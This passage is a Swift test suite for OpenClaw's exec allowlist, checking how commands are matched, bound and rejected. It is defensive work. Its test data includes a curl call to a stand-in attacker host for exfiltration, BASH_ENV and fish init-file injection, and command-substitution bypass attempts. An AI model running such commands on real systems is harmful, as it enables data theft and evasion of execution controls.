import CryptoKit
import Foundation
import Testing
@testable import OpenClaw

/// These cases cover optional `security=allowlist` behavior.
struct ExecAllowlistTests {
    private struct ShellParserParityFixture: Decodable {
        struct Case: Decodable {
            let id: String
            let command: String
            let ok: Bool
            let executables: [String]
        }

        let cases: [Case]
    }

    private struct WrapperResolutionParityFixture: Decodable {
        struct Case: Decodable {
            let id: String
            let argv: [String]
            let expectedRawExecutable: String?
        }

        let cases: [Case]
    }

    private static func loadShellParserParityCases() throws -> [ShellParserParityFixture.Case] {
        let fixtureURL = self.fixtureURL(filename: "exec-allowlist-shell-parser-parity.json")
        let data = try Data(contentsOf: fixtureURL)
        let fixture = try JSONDecoder().decode(ShellParserParityFixture.self, from: data)
        return fixture.cases
    }

    private static func loadWrapperResolutionParityCases() throws -> [WrapperResolutionParityFixture.Case] {
        let fixtureURL = self.fixtureURL(filename: "exec-wrapper-resolution-parity.json")
        let data = try Data(contentsOf: fixtureURL)
        let fixture = try JSONDecoder().decode(WrapperResolutionParityFixture.self, from: data)
        return fixture.cases
    }

    private static func hashedArgPattern(_ argv: [String]) -> String {
        let arguments = Array(argv.dropFirst())
        let subject = "\(arguments.count)\0" + arguments
            .map { "\($0.data(using: .utf8)?.count ?? 0)\0\($0)\0" }
            .joined()
        let digest = SHA256.hash(data: Data(subject.utf8))
        return "sha256:argv:" + digest.map { String(format: "%02x", $0) }.joined()
    }

    private static func fixtureURL(filename: String) -> URL {
        var repoRoot = URL(fileURLWithPath: #filePath)
        for _ in 0..<5 {
            repoRoot.deleteLastPathComponent()
        }
        return repoRoot
            .appendingPathComponent("test")
            .appendingPathComponent("fixtures")
            .appendingPathComponent(filename)
    }

    private static func homebrewRGResolution() -> ExecCommandResolution {
        ExecCommandResolution(
            rawExecutable: "rg",
            resolvedPath: "/opt/homebrew/bin/rg",
            executableName: "rg",
            cwd: nil)
    }

    private static func makeExecutable(at url: URL, body: String = "#!/bin/sh\nexit 0\n") throws {
        try Data(body.utf8).write(to: url)
        try FileManager().setAttributes([.posixPermissions: 0o755], ofItemAtPath: url.path)
    }

    @Test func `match uses resolved path`() {
        let entry = ExecAllowlistEntry(pattern: "/opt/homebrew/bin/rg")
        let resolution = Self.homebrewRGResolution()
        let match = ExecAllowlistMatcher.match(entries: [entry], resolution: resolution)
        #expect(match?.pattern == entry.pattern)
    }

    @Test func `match accepts basename pattern for PATH resolved executable`() {
        let entry = ExecAllowlistEntry(pattern: "rg")
        let resolution = Self.homebrewRGResolution()
        let match = ExecAllowlistMatcher.match(entries: [entry], resolution: resolution)
        #expect(match?.pattern == entry.pattern)
    }

    @Test func `match accepts basename glob for PATH resolved executable`() {
        let entry = ExecAllowlistEntry(pattern: "r?")
        let resolution = Self.homebrewRGResolution()
        let match = ExecAllowlistMatcher.match(entries: [entry], resolution: resolution)
        #expect(match?.pattern == entry.pattern)
    }

    @Test func `match never treats durable command markers as executable patterns`() {
        for marker in ["=command:0123456789abcdef", "=node-command:0123456789abcdef"] {
            let entry = ExecAllowlistEntry(pattern: marker, source: "allow-always")
            let resolution = ExecCommandResolution(
                rawExecutable: marker,
                resolvedPath: "/Users/test/.local/bin/\(marker)",
                executableName: marker,
                cwd: nil)
            #expect(ExecAllowlistMatcher.match(entries: [entry], resolution: resolution) == nil)
        }
    }

    @Test func `match ignores basename for path selected executable`() {
        let entry = ExecAllowlistEntry(pattern: "echo")
        let relativeResolution = ExecCommandResolution(
            rawExecutable: "./echo",
            resolvedPath: "/tmp/oc-basename/echo",
            executableName: "echo",
            cwd: "/tmp/oc-basename")
        let absoluteResolution = ExecCommandResolution(
            rawExecutable: "/tmp/oc-basename/echo",
            resolvedPath: "/tmp/oc-basename/echo",
            executableName: "echo",
            cwd: "/tmp/oc-basename")
        #expect(ExecAllowlistMatcher.match(entries: [entry], resolution: relativeResolution) == nil)
        #expect(ExecAllowlistMatcher.match(entries: [entry], resolution: absoluteResolution) == nil)
    }

    @Test func `match is case sensitive on macOS`() {
        let entry = ExecAllowlistEntry(pattern: "/OPT/HOMEBREW/BIN/RG")
        let resolution = Self.homebrewRGResolution()
        let match = ExecAllowlistMatcher.match(entries: [entry], resolution: resolution)
        #expect(match == nil)
    }

    @Test func `match supports glob star`() {
        let entry = ExecAllowlistEntry(pattern: "/opt/**/rg")
        let resolution = Self.homebrewRGResolution()
        let match = ExecAllowlistMatcher.match(entries: [entry], resolution: resolution)
        #expect(match?.pattern == entry.pattern)
    }

    @Test func `single character glob does not cross path separator`() {
        let entry = ExecAllowlistEntry(pattern: "/tmp/a?b")
        let resolution = ExecCommandResolution(
            rawExecutable: "/tmp/a/b",
            resolvedPath: "/tmp/a/b",
            resolvedRealPath: "/tmp/a/b",
            executableName: "b",
            cwd: nil)
        #expect(ExecAllowlistMatcher.match(entries: [entry], resolution: resolution) == nil)
    }

    @Test func `match normalizes macOS private var alias`() {
        let entry = ExecAllowlistEntry(pattern: "/var/tmp/openclaw-tool")
        let resolution = ExecCommandResolution(
            rawExecutable: "/var/tmp/openclaw-tool",
            resolvedPath: "/var/tmp/openclaw-tool",
            resolvedRealPath: "/private/var/tmp/openclaw-tool",
            executableName: "openclaw-tool",
            cwd: nil)
        #expect(ExecAllowlistMatcher.match(entries: [entry], resolution: resolution) != nil)
    }

    @Test func `match enforces hand authored arg pattern and prefers it over path only fallback`() {
        let executable = "/usr/bin/python3"
        let fallback = ExecAllowlistEntry(id: "fallback", pattern: executable)
        let restricted = ExecAllowlistEntry(
            id: "restricted",
            pattern: executable,
            argPattern: #"^safe\.py$"#)
        let safe = ExecCommandResolution(
            rawExecutable: executable,
            resolvedPath: executable,
            resolvedRealPath: executable,
            executableName: "python3",
            cwd: nil,
            argv: [executable, "safe.py"])
        let unsafe = ExecCommandResolution(
            rawExecutable: executable,
            resolvedPath: executable,
            resolvedRealPath: executable,
            executableName: "python3",
            cwd: nil,
            argv: [executable, "unsafe.py"])

        #expect(ExecAllowlistMatcher.match(entries: [fallback, restricted], resolution: safe)?.id == "restricted")
        #expect(ExecAllowlistMatcher.match(entries: [fallback, restricted], resolution: unsafe)?.id == "fallback")
    }

    @Test func `match ignores legacy generated path only allow always entries`() {
        let executable = "/usr/bin/python3"
        let legacyGenerated = ExecAllowlistEntry(pattern: executable, source: "allow-always")
        let manual = ExecAllowlistEntry(pattern: executable)
        let resolution = ExecCommandResolution(
            rawExecutable: executable,
            resolvedPath: executable,
            resolvedRealPath: executable,
            executableName: "python3",
            cwd: nil,
            argv: [executable, "unsafe.py"])

        #expect(ExecAllowlistMatcher.match(entries: [legacyGenerated], resolution: resolution) == nil)
        #expect(ExecAllowlistMatcher.match(entries: [manual], resolution: resolution) != nil)
    }

    @Test func `match enforces generated nul arg patterns including zero args`() {
        let executable = "/usr/bin/printf"
        let zeroArgs = ExecAllowlistEntry(pattern: executable, argPattern: "^\0\0$")
        let oneArg = ExecAllowlistEntry(pattern: executable, argPattern: "^hello world\0$")
        let base = ExecCommandResolution(
            rawExecutable: executable,
            resolvedPath: executable,
            resolvedRealPath: executable,
            executableName: "printf",
            cwd: nil,
            argv: [executable])
        let withSpace = ExecCommandResolution(
            rawExecutable: executable,
            resolvedPath: executable,
            resolvedRealPath: executable,
            executableName: "printf",
            cwd: nil,
            argv: [executable, "hello world"])

        #expect(ExecAllowlistMatcher.match(entries: [zeroArgs], resolution: base) != nil)
        #expect(ExecAllowlistMatcher.match(entries: [oneArg], resolution: withSpace) != nil)
        #expect(ExecAllowlistMatcher.match(entries: [zeroArgs], resolution: withSpace) == nil)
    }

    @Test func `match enforces generated hashed arg patterns before regex fallback`() {
        let executable = "/usr/bin/curl"
        let approvedArgv = [executable, "https://trusted.example/install.sh"]
        let entry = ExecAllowlistEntry(
            pattern: executable,
            argPattern: Self.hashedArgPattern(approvedArgv))
        let approved = ExecCommandResolution(
            rawExecutable: executable,
            resolvedPath: executable,
            resolvedRealPath: executable,
            executableName: "curl",
            cwd: nil,
            argv: approvedArgv)
        let changed = ExecCommandResolution(
            rawExecutable: executable,
            resolvedPath: executable,
            resolvedRealPath: executable,
            executableName: "curl",
            cwd: nil,
            argv: [executable, entry.argPattern ?? "", "https://attacker.example/exfil"])

        #expect(ExecAllowlistMatcher.match(entries: [entry], resolution: approved) != nil)
        #expect(ExecAllowlistMatcher.match(entries: [entry], resolution: changed) == nil)
        #expect(entry.argPattern?.contains("trusted.example") == false)
    }

    @Test func `hashed arg pattern distinguishes zero args from empty args`() {
        let executable = "/usr/bin/tool"
        let zeroArgEntry = ExecAllowlistEntry(
            pattern: executable,
            argPattern: Self.hashedArgPattern([executable]))
        let noArgs = ExecCommandResolution(
            rawExecutable: executable,
            resolvedPath: executable,
            resolvedRealPath: executable,
            executableName: "tool",
            cwd: nil,
            argv: [executable])
        let emptyArgs = ExecCommandResolution(
            rawExecutable: executable,
            resolvedPath: executable,
            resolvedRealPath: executable,
            executableName: "tool",
            cwd: nil,
            argv: [executable, "", ""])

        #expect(zeroArgEntry.argPattern != Self.hashedArgPattern([executable, "", ""]))
        #expect(ExecAllowlistMatcher.match(entries: [zeroArgEntry], resolution: noArgs) != nil)
        #expect(ExecAllowlistMatcher.match(entries: [zeroArgEntry], resolution: emptyArgs) == nil)
    }

    @Test func `arg pattern does not discard redirect shaped direct argv literal`() {
        let executable = "/usr/bin/python3"
        let restricted = ExecAllowlistEntry(pattern: executable, argPattern: #"^safe\.py$"#)
        let explicit = ExecAllowlistEntry(
            pattern: executable,
            argPattern: #"^safe\.py 2>/dev/null$"#)
        let resolution = ExecCommandResolution(
            rawExecutable: executable,
            resolvedPath: executable,
            resolvedRealPath: executable,
            executableName: "python3",
            cwd: nil,
            argv: [executable, "safe.py", "2>/dev/null"])

        #expect(ExecAllowlistMatcher.match(entries: [restricted], resolution: resolution) == nil)
        #expect(ExecAllowlistMatcher.match(entries: [explicit], resolution: resolution)?.pattern == executable)
    }

    @Test func `arg pattern uses JavaScript regular expression semantics`() {
        let executable = "/usr/bin/printf"
        func resolution(_ argument: String) -> ExecCommandResolution {
            ExecCommandResolution(
                rawExecutable: executable,
                resolvedPath: executable,
                resolvedRealPath: executable,
                executableName: "printf",
                cwd: nil,
                argv: [executable, argument])
        }

        let digit = ExecAllowlistEntry(pattern: executable, argPattern: #"^\d$"#)
        #expect(ExecAllowlistMatcher.match(entries: [digit], resolution: resolution("1")) != nil)
        #expect(ExecAllowlistMatcher.match(entries: [digit], resolution: resolution("١")) == nil)

        let word = ExecAllowlistEntry(pattern: executable, argPattern: #"^\w$"#)
        #expect(ExecAllowlistMatcher.match(entries: [word], resolution: resolution("a")) != nil)
        #expect(ExecAllowlistMatcher.match(entries: [word], resolution: resolution("é")) == nil)

        let anchored = ExecAllowlistEntry(pattern: executable, argPattern: "^safe$")
        #expect(ExecAllowlistMatcher.match(entries: [anchored], resolution: resolution("safe")) != nil)
        #expect(ExecAllowlistMatcher.match(entries: [anchored], resolution: resolution("safe\n")) == nil)

        for icuOnlyPattern in [#"^a++$"#, #"^(?>a)$"#] {
            let entry = ExecAllowlistEntry(pattern: executable, argPattern: icuOnlyPattern)
            #expect(ExecAllowlistMatcher.match(entries: [entry], resolution: resolution("aa")) == nil)
        }
    }

    @Test func `arg pattern fails closed without argv or with invalid regex`() {
        let executable = "/usr/bin/printf"
        let noArgv = ExecCommandResolution(
            rawExecutable: executable,
            resolvedPath: executable,
            resolvedRealPath: executable,
            executableName: "printf",
            cwd: nil)
        let invalid = ExecAllowlistEntry(pattern: executable, argPattern: "[")
        let restricted = ExecAllowlistEntry(pattern: executable, argPattern: "^ok$")

        #expect(ExecAllowlistMatcher.match(entries: [invalid], resolution: noArgv) == nil)
        #expect(ExecAllowlistMatcher.match(entries: [restricted], resolution: noArgv) == nil)
    }

    @Test func `direct PATH command binds to resolved executable`() throws {
        let root = FileManager().temporaryDirectory
            .appendingPathComponent("openclaw-bind-path-\(UUID().uuidString)", isDirectory: true)
            .resolvingSymlinksInPath()
        defer { try? FileManager().removeItem(at: root) }
        try FileManager().createDirectory(at: root, withIntermediateDirectories: true)
        let executable = root.appendingPathComponent("oc-bind")
        try Self.makeExecutable(at: executable)

        let command = ["oc-bind", "literal"]
        let resolutions = ExecCommandResolution.resolveForAllowlist(
            command: command,
            rawCommand: nil,
            cwd: nil,
            env: ["PATH": root.path])

        #expect(resolutions.count == 1)
        #expect(ExecCommandResolution.bindForAllowlistExecution(
            command: command,
            rawCommand: nil,
            resolutions: resolutions) == [executable.path, "literal"])
    }

    @Test func `symlink allowlist match and execution stay bound to canonical target`() throws {
        let root = FileManager().temporaryDirectory
            .appendingPathComponent("openclaw-bind-symlink-\(UUID().uuidString)", isDirectory: true)
            .resolvingSymlinksInPath()
        defer { try? FileManager().removeItem(at: root) }
        try FileManager().createDirectory(at: root, withIntermediateDirectories: true)
        let first = root.appendingPathComponent("first")
        let second = root.appendingPathComponent("second")
        let alias = root.appendingPathComponent("tool")
        try Self.makeExecutable(at: first)
        try Self.makeExecutable(at: second)
        try FileManager().createSymbolicLink(at: alias, withDestinationURL: first)

        let command = [alias.path, "value"]
        let resolutions = ExecCommandResolution.resolveForAllowlist(
            command: command,
            rawCommand: nil,
            cwd: nil,
            env: nil)
        let resolution = try #require(resolutions.first)
        let targetEntry = ExecAllowlistEntry(pattern: first.path)
        let aliasEntry = ExecAllowlistEntry(pattern: alias.path)
        let bound = ExecCommandResolution.bindForAllowlistExecution(
            command: command,
            rawCommand: nil,
            resolutions: resolutions)

        #expect(ExecAllowlistMatcher.match(entries: [targetEntry], resolution: resolution) != nil)
        #expect(ExecAllowlistMatcher.match(entries: [aliasEntry], resolution: resolution) == nil)
        #expect(bound == [first.path, "value"])

        try FileManager().removeItem(at: alias)
        try FileManager().createSymbolicLink(at: alias, withDestinationURL: second)
        #expect(bound == [first.path, "value"])
    }

    @Test func `standard non-login sh transport binds one static command directly`() {
        let payload = "/usr/bin/printf 'literal value'"
        let command = ["/bin/sh", "-c", payload]
        let resolutions = ExecCommandResolution.resolveForAllowlist(
            command: command,
            rawCommand: payload,
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"])
        #expect(ExecCommandResolution.bindForAllowlistExecution(
            command: command,
            rawCommand: payload,
            resolutions: resolutions) == ["/usr/bin/printf", "literal value"])
    }

    @Test func `login sh transport remains one-shot because startup files are outside the binding`() {
        let payload = "/usr/bin/printf 'literal value'"
        let command = ["/bin/sh", "-lc", payload]
        let resolutions = ExecCommandResolution.resolveForAllowlist(
            command: command,
            rawCommand: payload,
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"])
        #expect(ExecCommandResolution.bindForAllowlistExecution(
            command: command,
            rawCommand: payload,
            resolutions: resolutions) == nil)
    }

    @Test func `nonstandard shell wrappers never receive reusable execution binding`() {
        let cases: [([String], String?)] = [
            (["/bin/sh", "-n", "-c", "/bin/rm /tmp/x"], "/bin/rm /tmp/x"),
            (["fish", "-c", "/usr/bin/printf literal"], nil),
            (["cmd", "/c", "/usr/bin/printf literal"], nil),
            (["pwsh", "-command", "/usr/bin/printf literal"], nil),
        ]

        for (command, rawCommand) in cases {
            let resolutions = ExecCommandResolution.resolveForAllowlist(
                command: command,
                rawCommand: rawCommand,
                cwd: nil,
                env: ["PATH": "/usr/bin:/bin"])
            #expect(!resolutions.isEmpty)
            #expect(ExecCommandResolution.bindForAllowlistExecution(
                command: command,
                rawCommand: rawCommand,
                resolutions: resolutions) == nil)
        }
    }

    @Test func `shell carriers and canonical shell aliases cannot bind`() {
        let directPath = "/usr/bin/true"
        for carrier in [
            "ash", "bash", "chrt", "cmd", "cmd.exe", "dash", "fish", "ionice", "ksh", "powershell",
            "powershell.exe", "pwsh", "pwsh.exe", "setsid", "sh", "taskset", "zsh",
        ] {
            let command = [carrier, "/tmp/unsafe-script"]
            let resolution = ExecCommandResolution(
                rawExecutable: carrier,
                resolvedPath: directPath,
                resolvedRealPath: directPath,
                executableName: carrier,
                cwd: nil,
                argv: command)
            #expect(ExecCommandResolution.bindForAllowlistExecution(
                command: command,
                rawCommand: nil,
                resolutions: [resolution]) == nil)
        }

        let aliasCommand = ["skill-shell", "-c", "/usr/bin/printf ok"]
        let aliasResolution = ExecCommandResolution(
            rawExecutable: "skill-shell",
            resolvedPath: "/tmp/skill-shell",
            resolvedRealPath: "/bin/sh",
            executableName: "skill-shell",
            cwd: nil,
            argv: aliasCommand)
        #expect(ExecCommandResolution.bindForAllowlistExecution(
            command: aliasCommand,
            rawCommand: nil,
            resolutions: [aliasResolution]) == nil)
    }

    @Test func `shell tokenization uses shell lexical separators only`() throws {
        for separator in ["\u{00A0}", "\u{2003}", "\r"] {
            let argument = "left\(separator)right\(separator)"
            let payload = "/usr/bin/printf \(argument)"
            let command = ["/bin/sh", "-c", payload]
            let resolutions = ExecCommandResolution.resolveForAllowlist(
                command: command,
                rawCommand: payload,
                cwd: nil,
                env: ["PATH": "/usr/bin:/bin"])
            let resolution = try #require(resolutions.first)

            #expect(resolution.argv == ["/usr/bin/printf", argument])
            #expect(ExecCommandResolution.bindForAllowlistExecution(
                command: command,
                rawCommand: payload,
                resolutions: resolutions) == ["/usr/bin/printf", argument])
        }

        let tabPayload = "/usr/bin/printf left\tright"
        let tabResolution = try #require(ExecCommandResolution.resolveForAllowlist(
            command: ["/bin/sh", "-c", tabPayload],
            rawCommand: tabPayload,
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"]).first)
        #expect(tabResolution.argv == ["/usr/bin/printf", "left", "right"])
        #expect(ExecCommandResolution.bindForAllowlistExecution(
            command: ["/bin/sh", "-c", tabPayload],
            rawCommand: tabPayload,
            resolutions: [tabResolution]) == ["/usr/bin/printf", "left", "right"])
    }

    @Test func `dynamic shell payloads cannot receive reusable binding`() {
        for payload in [
            "/usr/bin/printf $HOME",
            "/usr/bin/printf $(/usr/bin/id)",
            "/usr/bin/printf *",
            "/usr/bin/printf ok > /tmp/out",
            "/usr/bin/printf ok && /usr/bin/true",
            "FOO=bar /usr/bin/printf ok",
            "/usr/bin/printf ok # ignored",
        ] {
            let command = ["/bin/sh", "-lc", payload]
            let resolutions = ExecCommandResolution.resolveForAllowlist(
                command: command,
                rawCommand: payload,
                cwd: nil,
                env: ["PATH": "/usr/bin:/bin"])
            #expect(ExecCommandResolution.bindForAllowlistExecution(
                command: command,
                rawCommand: payload,
                resolutions: resolutions) == nil)
        }

        let assignmentPayload = "FOO=bar /usr/bin/printf ok"
        let spoofedAssignmentResolution = ExecCommandResolution(
            rawExecutable: "FOO=bar",
            resolvedPath: "/usr/bin/true",
            resolvedRealPath: "/usr/bin/true",
            executableName: "true",
            cwd: nil,
            argv: ["FOO=bar", "/usr/bin/printf", "ok"])
        #expect(ExecCommandResolution.bindForAllowlistExecution(
            command: ["/bin/sh", "-lc", assignmentPayload],
            rawCommand: assignmentPayload,
            resolutions: [spoofedAssignmentResolution]) == nil)
    }

    @Test func `env empty utility operands cannot receive reusable binding`() {
        for command in [
            ["/usr/bin/env", "", "/usr/bin/touch", "/tmp/x"],
            ["/usr/bin/env", "--", "   ", "/usr/bin/touch", "/tmp/x"],
        ] {
            #expect(ExecEnvInvocationUnwrapper.unwrapWithMetadata(command) == nil)
            let resolutions = ExecCommandResolution.resolveForAllowlist(
                command: command,
                rawCommand: nil,
                cwd: nil,
                env: ["PATH": "/usr/bin:/bin"])
            #expect(resolutions.first?.executableName == "env")
            #expect(ExecCommandResolution.bindForAllowlistExecution(
                command: command,
                rawCommand: nil,
                resolutions: resolutions) == nil)
        }
    }

    @Test func `env clear environment marker is not transparent`() throws {
        let clearCommand = ["/usr/bin/env", "-", "/usr/bin/true"]
        let clear = try #require(ExecEnvInvocationUnwrapper.unwrapWithMetadata(clearCommand))
        #expect(clear.usesModifiers)
        let clearResolutions = ExecCommandResolution.resolveForAllowlist(
            command: clearCommand,
            rawCommand: nil,
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"])
        #expect(clearResolutions.first?.executableName == "env")
        #expect(ExecCommandResolution.bindForAllowlistExecution(
            command: clearCommand,
            rawCommand: nil,
            resolutions: clearResolutions) == nil)

        let separatorCommand = ["/usr/bin/env", "--", "/usr/bin/true"]
        let separator = try #require(ExecEnvInvocationUnwrapper.unwrapWithMetadata(separatorCommand))
        #expect(!separator.usesModifiers)
        #expect(separator.command == ["/usr/bin/true"])
    }

    @Test func `non shell allowlist resolution ignores display text`() {
        let command = ["/usr/bin/env", "/usr/bin/printf", "ok"]
        let withoutDisplay = ExecCommandResolution.resolveForAllowlist(
            command: command,
            rawCommand: nil,
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"])
        let withDisplay = ExecCommandResolution.resolveForAllowlist(
            command: command,
            rawCommand: "/usr/bin/env /usr/bin/printf ok",
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"])

        #expect(withDisplay.map(\.rawExecutable) == withoutDisplay.map(\.rawExecutable))
        #expect(withDisplay.first?.resolvedRealPath == "/usr/bin/printf")
        #expect(ExecCommandResolution.bindForAllowlistExecution(
            command: command,
            rawCommand: "/usr/bin/env /usr/bin/printf ok",
            resolutions: withDisplay) == ["/usr/bin/printf", "ok"])
    }

    @Test func `shell comments and dispatch wrappers cannot receive reusable binding`() {
        let commented = ["/bin/sh", "-c", "/bin/rm /tmp/safe # /tmp/protected"]
        let commentedResolutions = ExecCommandResolution.resolveForAllowlist(
            command: commented,
            rawCommand: "/bin/rm /tmp/safe # /tmp/protected",
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"])
        #expect(ExecCommandResolution.bindForAllowlistExecution(
            command: commented,
            rawCommand: "/bin/rm /tmp/safe # /tmp/protected",
            resolutions: commentedResolutions) == nil)

        for command in [
            ["/usr/bin/nice", "/usr/bin/printf", "ok"],
            ["/bin/sh", "./script.sh"],
            ["npx", "some-package"],
        ] {
            let resolutions = ExecCommandResolution.resolveForAllowlist(
                command: command,
                rawCommand: nil,
                cwd: "/tmp",
                env: ["PATH": "/usr/bin:/bin"])
            #expect(ExecCommandResolution.bindForAllowlistExecution(
                command: command,
                rawCommand: nil,
                resolutions: resolutions) == nil)
        }
    }

    @Test func `resolve for allowlist splits shell chains`() {
        let command = ["/bin/sh", "-c", "echo allowlisted && /usr/bin/touch /tmp/openclaw-allowlist-test"]
        let resolutions = ExecCommandResolution.resolveForAllowlist(
            command: command,
            rawCommand: "echo allowlisted && /usr/bin/touch /tmp/openclaw-allowlist-test",
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"])
        #expect(resolutions.count == 2)
        #expect(resolutions[0].executableName == "echo")
        #expect(resolutions[1].executableName == "touch")
    }

    @Test func `resolve for allowlist splits posix combined c flag payloads`() {
        for command in [
            ["/bin/bash", "-xc", "/usr/bin/printf safe_marker"],
            ["/bin/bash", "-ec", "/usr/bin/printf safe_marker"],
            ["/bin/bash", "-euxc", "/usr/bin/printf safe_marker"],
            ["/bin/bash", "-cx", "/usr/bin/printf safe_marker"],
            ["/bin/bash", "-O", "extglob", "-xc", "/usr/bin/printf safe_marker"],
            ["/bin/bash", "-co", "vi", "/usr/bin/printf safe_marker"],
            ["/bin/bash", "-oc", "vi", "/usr/bin/printf safe_marker"],
            ["/bin/bash", "-cO", "extglob", "/usr/bin/printf safe_marker"],
            ["/bin/bash", "-xo", "vi", "-c", "/usr/bin/printf safe_marker"],
            ["/bin/bash", "-xO", "extglob", "-c", "/usr/bin/printf safe_marker"],
            ["/bin/bash", "+xo", "vi", "-c", "/usr/bin/printf safe_marker"],
            ["/bin/bash", "--rcfile", "/tmp/rc", "-c", "/usr/bin/printf safe_marker"],
            ["/bin/bash", "--init-file=/tmp/rc", "-c", "/usr/bin/printf safe_marker"],
        ] {
            let resolutions = ExecCommandResolution.resolveForAllowlist(
                command: command,
                rawCommand: nil,
                cwd: nil,
                env: ["PATH": "/usr/bin:/bin"])
            #expect(resolutions.count == 1)
            #expect(resolutions[0].resolvedPath == "/usr/bin/printf")
            #expect(resolutions[0].executableName == "printf")
        }
    }

    @Test func `resolve for allowlist treats c after posix shell operand as direct exec`() {
        for command in [
            ["/bin/bash", "./script.sh", "-c", "/usr/bin/printf safe_marker"],
            ["/bin/bash", "-x", "-C", "echo ok", "-c", "/usr/bin/printf safe_marker"],
        ] {
            let resolutions = ExecCommandResolution.resolveForAllowlist(
                command: command,
                rawCommand: nil,
                cwd: "/tmp",
                env: ["PATH": "/usr/bin:/bin"])
            #expect(resolutions.count == 1)
            #expect(resolutions[0].resolvedPath == "/bin/bash")
            #expect(resolutions[0].executableName == "bash")
        }
    }

    @Test func `resolve for allowlist fails closed for interactive posix shell wrappers`() {
        for command in [
            ["/bin/bash", "-i", "-c", "/usr/bin/printf safe_marker"],
            ["/bin/bash", "-ic", "/usr/bin/printf safe_marker"],
            ["/bin/bash", "--rcfile", "/tmp/payload.sh", "-i", "-c", "/usr/bin/printf safe_marker"],
            ["/usr/bin/fish", "--interactive", "-c", "/usr/bin/printf safe_marker"],
        ] {
            let resolutions = ExecCommandResolution.resolveForAllowlist(
                command: command,
                rawCommand: nil,
                cwd: nil,
                env: ["PATH": "/usr/bin:/bin"])
            #expect(resolutions.isEmpty)
        }
    }

    @Test func `resolve for allowlist fails closed for login shell wrappers`() {
        for command in [
            ["/bin/bash", "-l", "-c", "/usr/bin/printf safe_marker"],
            ["/bin/bash", "--login", "-c", "/usr/bin/printf safe_marker"],
            ["/bin/bash", "-xlc", "/usr/bin/printf safe_marker"],
            ["/bin/dash", "-lc", "/usr/bin/printf safe_marker"],
            ["ash", "-lc", "/usr/bin/printf safe_marker"],
            ["/usr/bin/fish", "-l", "-c", "/usr/bin/printf safe_marker"],
            ["/usr/bin/fish", "--login", "-c", "/usr/bin/printf safe_marker"],
            ["/bin/sh", "-lc", "/usr/bin/printf safe_marker"],
            ["/bin/sh", "-x", "-lc", "/usr/bin/printf safe_marker"],
            ["/usr/bin/env", "/bin/sh", "-lc", "/usr/bin/printf safe_marker"],
        ] {
            let resolutions = ExecCommandResolution.resolveForAllowlist(
                command: command,
                rawCommand: nil,
                cwd: nil,
                env: ["PATH": "/usr/bin:/bin"])
            #expect(resolutions.isEmpty)
        }
    }

    @Test func `resolve for allowlist fails closed for fish init command wrappers`() {
        for command in [
            ["/usr/bin/fish", "--init-command=/tmp/payload.fish", "-c", "/usr/bin/printf safe_marker"],
            ["/usr/bin/fish", "--init-command", "/tmp/payload.fish", "-c", "/usr/bin/printf safe_marker"],
            ["/usr/bin/fish", "-C", "/tmp/payload.fish", "-c", "/usr/bin/printf safe_marker"],
            ["/usr/bin/fish", "-C/tmp/payload.fish", "-c", "/usr/bin/printf safe_marker"],
            ["/usr/bin/fish", "--init-command", "-c; /tmp/payload.fish", "/usr/bin/printf safe_marker"],
            ["/usr/bin/fish", "-C", "-c", "/usr/bin/printf safe_marker"],
            ["/usr/bin/fish", "-c/tmp/payload.fish", "/usr/bin/printf safe_marker"],
        ] {
            let resolutions = ExecCommandResolution.resolveForAllowlist(
                command: command,
                rawCommand: nil,
                cwd: nil,
                env: ["PATH": "/usr/bin:/bin"])
            #expect(resolutions.isEmpty)
        }
    }

    @Test func `resolve for allowlist uses wrapper argv payload even with canonical raw command`() {
        let command = ["/bin/sh", "-c", "echo allowlisted && /usr/bin/touch /tmp/openclaw-allowlist-test"]
        let canonicalRaw = "/bin/sh -c \"echo allowlisted && /usr/bin/touch /tmp/openclaw-allowlist-test\""
        let resolutions = ExecCommandResolution.resolveForAllowlist(
            command: command,
            rawCommand: canonicalRaw,
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"])
        #expect(resolutions.count == 2)
        #expect(resolutions[0].executableName == "echo")
        #expect(resolutions[1].executableName == "touch")
    }

    @Test func `resolve for allowlist preserves generated sh lc raw payload binding`() {
        let command = ["/bin/sh", "-lc", "/usr/bin/printf safe_marker"]
        let resolutions = ExecCommandResolution.resolveForAllowlist(
            command: command,
            rawCommand: "/usr/bin/printf safe_marker",
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"])
        #expect(resolutions.count == 1)
        #expect(resolutions[0].resolvedPath == "/usr/bin/printf")
        #expect(resolutions[0].executableName == "printf")

        let rawlessResolutions = ExecCommandResolution.resolveForAllowlist(
            command: command,
            rawCommand: nil,
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"])
        #expect(rawlessResolutions.isEmpty)
    }

    @Test func `resolve for allowlist fails closed for env modified shell wrappers`() {
        let command = ["/usr/bin/env", "BASH_ENV=/tmp/payload.sh", "bash", "-lc", "echo allowlisted"]
        let canonicalRaw = "/usr/bin/env BASH_ENV=/tmp/payload.sh bash -lc \"echo allowlisted\""
        let resolutions = ExecCommandResolution.resolveForAllowlist(
            command: command,
            rawCommand: canonicalRaw,
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"])
        #expect(resolutions.isEmpty)
    }

    @Test func `resolve for allowlist fails closed for env dash shell wrappers`() {
        let command = ["/usr/bin/env", "-", "bash", "-lc", "echo allowlisted"]
        let canonicalRaw = "/usr/bin/env - bash -lc \"echo allowlisted\""
        let resolutions = ExecCommandResolution.resolveForAllowlist(
            command: command,
            rawCommand: canonicalRaw,
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"])
        #expect(resolutions.isEmpty)
    }

    @Test func `resolve for allowlist keeps quoted operators in single segment`() {
        let command = ["/bin/sh", "-c", "echo \"a && b\""]
        let resolutions = ExecCommandResolution.resolveForAllowlist(
            command: command,
            rawCommand: "echo \"a && b\"",
            cwd: nil,
            env: ["PATH": "/usr/bin:/bin"])
        #expect(resolutions.count == 1)
        #expect(resolutions[0].executableName == "echo")
    }

    @Test func `resolve for allowlist fails closed on command substitution`() {
        let command = ["/bin/sh", "-c", "echo $(/usr/bin/touch /tmp/openclaw-allowlist-test-subst)"]
